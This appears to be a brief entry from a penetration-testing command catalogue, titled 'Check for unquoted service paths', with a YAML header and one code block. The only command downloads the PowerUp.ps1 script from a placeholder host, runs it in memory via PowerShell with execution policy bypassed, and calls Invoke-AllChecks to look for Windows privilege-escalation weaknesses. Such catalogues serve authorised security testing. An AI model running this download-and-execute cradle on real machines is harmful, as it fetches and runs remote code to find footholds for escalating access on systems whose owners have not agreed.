---
id: 1baba626-5b38-4914-9da0-a49f3888f8f2
name: Check for unquoted service paths
type: command
executor: bash
data: powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1');
  Invoke-AllChecks"
output: null
created_at: '2023-04-06T03:56:29.682727+00:00'
updated_at: '2023-04-10T20:37:34.119569+00:00'
---

# Check for unquoted service paths

```bash
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
```


